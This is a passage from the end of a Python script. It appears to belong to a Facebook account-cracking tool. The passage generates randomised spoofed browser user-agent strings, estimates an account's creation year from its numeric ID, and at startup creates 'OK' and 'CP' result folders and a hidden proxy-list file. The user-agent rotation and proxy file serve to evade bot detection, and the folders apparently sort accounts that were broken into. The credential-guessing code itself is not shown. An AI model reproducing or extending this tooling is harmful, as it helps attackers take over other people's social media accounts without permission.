		f"Mozilla/5.0 (Linux; Android {a}; {m} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h} Mobile Safari/537.36{random.choice(['',f' T7/12.10 SP-engine/2.28.0 baiduboxapp/12.10.0.10 (Baidu; P1 10) NABar/1.0',f' OPR/{str(random.randint(20,50))}.{str(random.randint(0,1))}.{str(random.randint(1000,4999))}.{str(random.randint(70000,209999))}',f' OPR/{str(random.randint(50,80))}.{str(random.randint(0,1))}.{str(random.randint(1000,6999))}.{str(random.randint(10000,69999))}',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm64',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm',f' [FB_IAB/FB4A;FBAV/{str(random.randint(400,449))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f'[FBAN/EMA;FBLC/id_ID;FBAV/{str(random.randint(300,389))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' [FB_IAB/Orca-Android;FBAV/{str(random.randint(400,439))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' EdgA/{str(random.randint(30,129))}.0.{str(random.randint(1100,1299))}.{str(random.randint(10,99))}',f' Edg/{str(random.randint(73,129))}.0.{str(random.randint(1200,2999))}.{str(random.randint(73,250))}',f' baiduboxapp/4.8 (Baidu; P1 4.1.2)',f' GNews Android/2022166490',''])}",
		f"Mozilla/5.0 (iPad; CPU OS {n} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/605.1.15{random.choice([f' GNews iOS/5.74.201',f' QBWebViewUA/2 QBWebViewType/1 WKType/1',''])}",
		f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{str(random.randint(0,10))}_{str(random.randint(0,10))}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{str(random.randint(10,20))}.0 Safari/605.1.15{random.choice([f' GNews iOS/5.74.201',f' QBWebViewUA/2 QBWebViewType/1 WKType/1',''])}",
		f"Mozilla/5.0 (iPhone; CPU iPhone OS {n} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/115 Mobile/15E148 Safari/605.1.15",
		f"Mozilla/5.0 (iPhone; CPU iPhone OS {n} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{str(random.randint(10,20))}.0 MQQBrowser/14.7.6 Mobile/15E148 Safari/604.1",
		f"Mozilla/5.0 (iPhone; CPU iPhone OS {n} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/122.0.2365.9 Version/{str(random.randint(10,20))}.0 Mobile/15E148 Safari/604.1",
		f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{str(random.randint(0,10))}_{str(random.randint(0,10))}) AppleWebKit/583.3 (KHTML, like Gecko) Chrome/{e}.{f}.{g}.{h} Safari/583.3 {random.choice([f' Edg/{str(random.randint(73,129))}.0.{str(random.randint(1200,2999))}.{str(random.randint(73,250))}',''])}",
		f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{str(random.randint(0,10))}_{str(random.randint(0,10))}; en-US) AppleWebKit/603.7.5 (KHTML, like Gecko) Version/13.0.3 Safari/603.7.5",
		f"Mozilla/5.0 (Linux; Android {a}; {random.choice([f'{l}','Infinix X608'])} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h} Mobile Safari/537.36{random.choice(['',f' T7/12.10 SP-engine/2.28.0 baiduboxapp/12.10.0.10 (Baidu; P1 10) NABar/1.0',f' OPR/{str(random.randint(20,50))}.{str(random.randint(0,1))}.{str(random.randint(1000,4999))}.{str(random.randint(70000,209999))}',f' OPR/{str(random.randint(50,80))}.{str(random.randint(0,1))}.{str(random.randint(1000,6999))}.{str(random.randint(10000,69999))}',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm64',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm',f' [FB_IAB/FB4A;FBAV/{str(random.randint(400,449))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f'[FBAN/EMA;FBLC/id_ID;FBAV/{str(random.randint(300,389))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' [FB_IAB/Orca-Android;FBAV/{str(random.randint(400,439))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' EdgA/{str(random.randint(30,129))}.0.{str(random.randint(1100,1299))}.{str(random.randint(10,99))}',f' Edg/{str(random.randint(73,129))}.0.{str(random.randint(1200,2999))}.{str(random.randint(73,250))}',f' baiduboxapp/4.8 (Baidu; P1 4.1.2)',f' GNews Android/2022166490',''])}",
		f"Mozilla/5.0 (Linux; U; Android {a}; {o}; {random.choice([f'{l}','Infinix X608'])} Build/{b}.{c}.0{d}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h}{random.choice([f' MZBrowser/{str(random.randint(6,8))}.{str(random.randint(0,10))}.{str(random.randint(0,10))} UWS/2.15.0.2',f' MZBrowser/{str(random.randint(8,10))}.{str(random.randint(0,20))}.{str(random.randint(0,20))}',f' MQQBrowser/{str(random.randint(4,10))}.{str(random.randint(0,9))}',f' UCBrowser/{str(random.randint(1,9))}.{str(random.randint(1,9))}.{str(random.randint(1,9))}.{str(random.randint(100,1299))}'])} Mobile Safari/537.36",
		f"Mozilla/5.0 (Linux; U; Android {a}; {o}; {random.choice([f'{j}',f'{k}',f'{l}',f'{m}'])} Build/{b}.{c}.0{d}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h} Mobile Safari/537.36{random.choice([f' OppoBrowser/{str(random.randint(1,25))}.{str(random.randint(1,9))}.0.{str(random.randint(1,9))}',f' RealmeBrowser/{str(random.randint(10,39))}.{str(random.randint(1,9))}.0.{str(random.randint(1,9))}',f' HeyTapBrowser/{str(random.randint(6,49))}.{str(random.randint(7,8))}.{str(random.randint(2,40))}.{str(random.randint(1,9))}',f' OPR/{str(random.randint(20,50))}.{str(random.randint(0,1))}.{str(random.randint(1000,4999))}.{str(random.randint(70000,209999))}',f' OPR/{str(random.randint(50,80))}.{str(random.randint(0,1))}.{str(random.randint(1000,6999))}.{str(random.randint(10000,69999))}'])}",
		f"Mozilla/5.0 (Linux; Android {a}; {random.choice([f'{l}','Infinix X608'])} Build/{b}.{c}.0{d}; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h} Mobile Safari/537.36 Puffin/8.3.1.41624AP",
		f"Mozilla/5.0 (Linux; Android {a}; {random.choice(['WP21','TECNO KE7','RG655'])} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h} Mobile Safari/537.36{random.choice(['',f' T7/12.10 SP-engine/2.28.0 baiduboxapp/12.10.0.10 (Baidu; P1 10) NABar/1.0',f' OPR/{str(random.randint(20,50))}.{str(random.randint(0,1))}.{str(random.randint(1000,4999))}.{str(random.randint(70000,209999))}',f' OPR/{str(random.randint(50,80))}.{str(random.randint(0,1))}.{str(random.randint(1000,6999))}.{str(random.randint(10000,69999))}',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm64',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm',f' [FB_IAB/FB4A;FBAV/{str(random.randint(400,449))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f'[FBAN/EMA;FBLC/id_ID;FBAV/{str(random.randint(300,389))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' [FB_IAB/Orca-Android;FBAV/{str(random.randint(400,439))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' EdgA/{str(random.randint(30,129))}.0.{str(random.randint(1100,1299))}.{str(random.randint(10,99))}',f' Edg/{str(random.randint(73,129))}.0.{str(random.randint(1200,2999))}.{str(random.randint(73,250))}',f' baiduboxapp/4.8 (Baidu; P1 4.1.2)',f' GNews Android/2022166490',''])}"
	])
	return z

def Ugen2():
	a = 'Mozilla/5.0 (Linux; U; Android'
	b = random.choice(['7.0','8.1.0','4','5','6','7','8','9','10','11','12'])
	c = 'SM-J710MN)'
	d = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e = random.randrange(1, 999)
	f = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h = random.randrange(73, 100)
	i = '0'
	j = random.randrange(4200, 4900)
	k = random.randrange(40, 150)
	l = 'Mobile Safari/537.36'
	m = f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	return m

#<-[ Ceker-Tahun-Akun ]->#
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:tahunz='2023-2024'
	elif len(fx) in [9,10]:tahunz = '2008'
	elif len(fx)==8:tahunz = '2007'
	elif len(fx)==7:tahunz = '2006'
	else:tahunz='2023-2024'
	return tahunz
	
#<-[ System-Kontol ]->#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	MainMenu()